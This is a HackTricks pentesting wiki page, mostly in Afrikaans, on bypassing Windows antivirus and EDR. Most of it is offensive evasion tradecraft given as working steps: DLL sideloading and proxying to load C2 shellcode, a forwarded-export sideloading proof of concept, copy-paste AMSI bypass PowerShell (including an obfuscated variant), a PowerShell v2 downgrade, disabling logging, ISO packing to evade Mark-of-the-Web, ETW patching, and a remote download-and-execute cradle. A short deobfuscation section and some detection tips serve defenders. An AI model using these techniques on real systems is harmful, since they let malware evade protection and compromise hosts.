# Antivirus (AV) Omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n hulpmiddel om Windows Defender se werking te stop.
- [no-defender](https://github.com/es3n1n/no-defender): 'n hulpmiddel om Windows Defender se werking te stop deur 'n ander AV na te boots.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Ontduikingsmetodologie**

Tans gebruik AV's verskillende metodes om te bepaal of 'n lêer kwaadwillig is of nie: statiese deteksie, dinamiese analise, en vir die meer gevorderde EDRs, gedragsanalise.

### **Statiese deteksie**

Statiese deteksie word bereik deur bekende kwaadwillige stringe of bytes in 'n binêr of skrip te flag, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan laat vasloop, aangesien hulle waarskynlik al ontleed en as kwaadwillig aangeteken is. Daar is 'n paar maniere om hierdie soort deteksie te omseil:

- **Enkripsie**

As jy die binêr enkripteer, sal daar geen manier wees vir AV om jou program te herken nie, maar jy sal 'n soort loader nodig hê om die program in geheue te deskripteer en uit te voer.

- **Obfuskasie**

Soms is dit genoeg om net sekere stringe in jou binêr of skrip te verander om dit verby AV te kry, maar dit kan tydrowend wees afhangend van wat jy probeer obfuskeer.

- **Pasgemaakte gereedskap**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte signature wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> 'n Goeie manier om teen Windows Defender se statiese deteksie te toets is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel basies die lêer in veelvuldige segmente en laat Defender elke segment individueel scan; op hierdie manier kan dit jou presies vertel watter stringe of bytes in jou binêr geflag is.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion nagaan.

### **Dinamiese analise**

Dinamiese analise is wanneer die AV jou binêr in 'n sandbox laat loop en kyk na kwaadwillige aktiwiteit (bv. probeer om jou blaaier se wagwoorde te ontsleutel en te lees, 'n minidump op LSASS uit te voer, ens.). Hierdie deel kan bietjie moeilik wees om mee te werk, maar hier is 'n paar dinge wat jy kan doen om sandbokse te ontduik.

- **Wag (sleep) voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit 'n goeie manier wees om AV se dinamiese analise te omseil. AV's het 'n baie kort tyd om lêers te scan om nie die gebruiker se werkvloei te onderbreek nie, so die gebruik van lang sleeps kan die analise van binêre lêers ontwrig. Die probleem is dat baie AV-sandboxe die slaap eenvoudig kan oorslaan, afhangend van hoe dit geïmplementeer is.
- **Kontroleer masjien se hulpbronne** Gewoonlik het Sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien vertraag. Jy kan hier ook baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaierafsetlae (fan speeds) na te gaan; nie alles sal in die sandbox geïmplementeer wees nie.
- **Masjien-spesifieke kontroles** As jy 'n gebruiker wil teiken wie se werkstasie aan die "contoso.local" domein behoort, kan jy 'n kontrole doen op die rekenaar se domein om te sien of dit met die een wat jy gespesifiseer het ooreenstem; as dit nie ooreenstem nie, kan jy jou program laat beëindig.

Dit blyk dat Microsoft Defender se Sandbox se computername HAL9TH is, so jy kan vir die computer name in jou malware kontroleer voor detonering; as die naam HAL9TH ooreenstem, beteken dit jy is binne Defender se sandbox, en dan kan jy jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sommige ander baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die benadering teen Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>

Soos ons vroeër gesê het in hierdie pos, sal **publieke tools** uiteindelik **gedetecteer word**, so jy moet jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy 'n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik die laasgenoemde. Neem mimikatz as 'n voorbeeld — dit is waarskynlik een van, indien nie die mees ge-flagte stuk malware deur AVs en EDRs nie; alhoewel die projek self baie cool is, is dit ook 'n nagmerrie om daarmee te werk om rond AV's te kom, so kyk eerder na alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads wysig vir ontduiking, maak seker om die outomatiese voorbeeldindiening in Defender af te skakel, en asseblief, ernstig: DO NOT UPLOAD TO VIRUSTOTAL as jou doel is om op die lang duur ontduiking te bereik. As jy wil toets of jou payload deur 'n spesifieke AV gedetecteer word, installeer dit op 'n VM, probeer om outomatiese voorbeeldindiening af te skakel, en toets daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, prioritiseer altyd die gebruik van DLLs vir ontduiking; uit my ervaring word DLL-lêers gewoonlik baie minder gedetecteer en ontleed, so dit is 'n baie eenvoudige truuk om in sekere gevalle deteksie te vermy (as jou payload natuurlik 'n manier het om as 'n DLL uitgevoer te word).

Soos ons in hierdie beeld kan sien, het 'n DLL Payload van Havoc 'n deteksiekoers van 4/26 op antiscan.me, terwyl die EXE payload 'n 7/26 deteksiekoers het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me vergelyking van 'n normale Havoc EXE payload versus 'n normale Havoc DLL</p></figcaption></figure>

Nou wys ons 'n paar truuks wat jy met DLL-lêers kan gebruik om baie meer onopvallend te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak voordeel van die DLL-soekorde wat deur die loader gebruik word deur die slagoffer aansoek en die kwaadwillige payload(s) langs mekaar te posisioneer.

Jy kan programme nagaan wat vatbaar is vir DLL Sideloading met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell skrip:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL files wat hulle probeer laai, uitset.

Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable programs self verken**, hierdie tegniek is redelik onopvallend as dit behoorlik toegepas word, maar as jy publiek-bekende DLL Sideloadable programs gebruik, kan jy maklik gevang word.

Net deur 'n skadelike DLL te plaas met die naam wat 'n program verwag om te laai, sal nie noodwendig jou payload laai nie, want die program verwag sekere spesifieke funksies binne daardie DLL; om hierdie probleem reg te stel, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.

**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (en skadelike) DLL na die oorspronklike DLL deur, waardeur die program se funksionaliteit behoue bly en jy in staat is om die uitvoering van jou payload te hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project van [@flangvik](https://twitter.com/Flangvik/) gebruik

Dit is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon, en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Hier is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Albei ons shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 deteksiesyfer op [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer in-diepte te leer oor wat ons bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies exporteer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die export entry 'n ASCII string van die vorm `TargetDll.TargetFunc`. Wanneer 'n oproeper die export oplos, sal die Windows loader:

- Laai `TargetDll` as dit nie reeds gelaai is nie
- Los `TargetFunc` daaruit op

Belangrike gedrag om te verstaan:
- As `TargetDll` 'n KnownDLL is, word dit verskaf vanuit die beskermde KnownDLLs namespace (bv. ntdll, kernelbase, ole32).
- Indien `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids insluit van die module wat die forward-resolusie uitvoer.

Dit maak 'n indirekte sideloading-primitive moontlik: vind 'n gesigneerde DLL wat 'n funksie eksporteer wat doorgestuur word na 'n nie-KnownDLL modulenaam, en plaas daardie gesigneerde DLL saam in dieselfde gids as 'n deur 'n aanvaller beheerde DLL wat presies dieselfde naam het as die forwarded target module. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde gids, wat jou DllMain uitvoer.

Voorbeeld waargeneem op Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit opgelos volgens die normale soekorde.

PoC (copy-paste):
1) Kopieer die gesigneerde stelsel-DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. 'n Minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die doorgestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ontlok die forward met 'n gesigneerde LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (gesigneer) laai die side-by-side `keyiso.dll` (gesigneer)
- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die lader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die lader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy slegs 'n "missing API" fout nadat `DllMain` reeds geloop het

Jagwenke:
- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports opnoem met gereedskap soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporings-/verdedigingsidees:
- Monitor LOLBins (bv., rundll32.exe) wat gesigneerde DLLs van nie-stelselpaaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam uit daardie gids
- Waarsku op proses-/modulekettings soos: `rundll32.exe` → nie-stelsel `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikerskryfbare paaie
- Handhaaf code-integriteitsbeleide (WDAC/AppLocker) en weier skryf+uitvoer in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n onopvallende wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is net 'n kat-en-muis-speletjie — wat vandag werk kan môre opgespoor word, so moenie net op een tool staatmaak nie; indien moontlik, probeer om verskeie evasion techniques aaneen te skakel.

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs **files on disk** skandeer, so as jy op een of ander manier payloads **directly in-memory** kon uitvoer, kon die AV niks doen nie omdat dit nie genoeg sigbaarheid gehad het.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit laat antivirus-oplossings toe om skripgedrag te inspekteer deur skripinhoud beskikbaar te stel in 'n vorm wat nie gekodeer of obfuskeer is nie.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let daarop hoe dit `amsi:` voorvoeg en dan die pad na die uitvoerbare lêer waarvan die skrip gehardloop het, in hierdie geval, powershell.exe

Ons het niks na die skyf geskryf nie, maar is steeds in-memory vasgevang vanweë AMSI.

Verder, beginend met **.NET 4.8**, word C# kode ook deur AMSI geloop. Dit beïnvloed selfs `Assembly.Load(byte[])` vir in-memory uitvoering. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) te gebruik vir in-memory uitvoering as jy AMSI wil ontduik.

Daar is 'n paar maniere om rondom AMSI te werk:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met static detections werk, kan dit 'n goeie manier wees om die skripte wat jy probeer laai te wysig om detectie te ontduik.

AMSI het egter die vermoë om skripte te de-obfuskeer selfs al het dit meerdere lae, so obfuscation kan 'n slegte opsie wees, afhangend van hoe dit gedoen word. Dit maak dit nie altyd reguit om te ontduik nie. Soms hoef jy net 'n paar veranderlike name te verander en jy is reg, so dit hang daarvan af hoe ernstig iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laad, is dit moontlik om dit maklik te manipuleer, selfs terwyl jy as 'n ongereguleerde gebruiker werk. As gevolg van hierdie tekortkoming in die implementering van AMSI, het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Al wat dit geverg het, was een reël powershell-kode om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gevlag, so 'n aanpassing is nodig om hierdie tegniek te gebruik.

Hier is 'n aangepaste AMSI bypass wat ek geneem het van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gevlag sal word sodra hierdie pos uitkom, so moet jy geen kode publiseer as jou plan is om onopgemerk te bly.

**Memory Patching**

Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/_RastaMouse/) en dit behels die vind van die adres vir die "AmsiScanBuffer" funksie in amsi.dll (verantwoordelik vir die skandering van die user-supplied input) en dit oorskryf met instruksies om die kode vir E_INVALIDARG terug te gee; op hierdie manier sal die uitslag van die werklike skandering 0 teruggee, wat as 'n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verklaring.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omseil — kyk na [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

Hierdie hulpmiddel [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) genereer ook 'n skrip om AMSI te omseil.

**Verwyder die gedetekteerde handtekening**

Jy kan 'n hulpmiddel soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekteerde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses vir die AMSI-handtekening te skandeer en dit dan met NOP-instruksies oor te skryf, wat dit effektief uit die geheue verwyder.

**AV/EDR products that uses AMSI**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik Powershell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is a feature that allows you to log all PowerShell commands executed on a system. This can be useful for auditing and troubleshooting purposes, but it can also be a **problem for attackers who want to evade detection**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Jy kan 'n instrument soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, so jy kan jou skripte laat loop sonder om deur AMSI geskan te word. Jy kan dit doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n powershell te spawn sonder verdediging (dit is wat `powerpick` from Cobal Strike uses).


## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke berus op die enkriptering van data, wat die entropie van die binêre sal verhoog en dit vir AVs en EDRs makliker maak om dit op te spoor. Wees versigtig hiermee en pas enkripsie moontlik slegs toe op spesifieke gedeeltes van jou kode wat sensitief is of verberg moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2 profile
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, classes en veranderlike name herstel en konstante stringe dekripteer.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) compilation suite te verskaf wat verhoogde sagteware-sekuriteit deur middel van code obfuscation en tamper-proofing moontlik maak.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om, tydens die kompileerfase, obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag obfuscated operations by wat deur die C++ template metaprogramming framework gegenereer word, wat die lewe van iemand wat die toepassing wil crack 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat verskeie verskillende pe files kan obfuscate, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitraire executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fine-grained code obfuscation framework vir LLVM-supported languages wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscates 'n program op assembly code vlak deur gewone instruksies te transformeer in ROP chains, wat ons natuurlike begrip van normale control flow frustreer.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL in shellcode omskakel en dit dan laai

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om op te let dat uitvoerbare lêers wat met 'n **vertroude** ondertekeningssertifikaat geteken is, **nie SmartScreen sal aktiveer nie**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Voorbeeldgebruik:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demo om SmartScreen te omseil deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logmeganisme in Windows wat toepassings en stelselkomponente toelaat om **events te log**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadaardige aktiwiteite te monitor en te bespeur.

Soos met hoe AMSI gedeaktiveer (omseil) kan word, is dit ook moontlik om die **`EtwEventWrite`** funksie van 'n user space proses onmiddellik te laat terugkeer sonder om enige events te log. Dit word bereik deur die funksie in geheue te patch sodat dit onmiddellik terugkeer, en effektief ETW-logging vir daardie proses uit te skakel.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory is al vir 'n geruime tyd bekend en dit is steeds 'n uitstekende manier om jou post-exploitation tools te laat loop sonder om deur AV uitgehaal te word.

Aangesien die payload direk in geheue gelaai sal word sonder om die skyf te raak, hoef ons net bekommerd te wees oor die patching van AMSI vir die hele proses.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels die **spawning van 'n nuwe offerproses**, inbedding van jou post-exploitation kwaadwillige kode in daardie nuwe proses, die uitvoering van jou kwaadaardige kode en, wanneer klaar, die nuwe proses te beëindig. Dit het beide voordele en nadele. Die voordeel van die fork-and-run metode is dat uitvoering buite ons Beacon implant proses plaasvind. Dit beteken dat as iets by ons post-exploitation aksie verkeerd gaan of gevang word, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor die inbedding van die post-exploitation kwaadwillige kode **in sy eie proses**. Op hierdie manier kan jy vermy om 'n nuwe proses te skep wat deur AV geskan word, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **groter kans** is om jou **beacon te verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor C# Assembly loading, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **from PowerShell** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode in ander tale uit te voer deur die gekompromitteerde masjien toegang te gee tot die interpreter-omgewing wat op die Attacker Controlled SMB share geïnstalleer is.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB share toe te laat, kan jy **arbitrêre kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

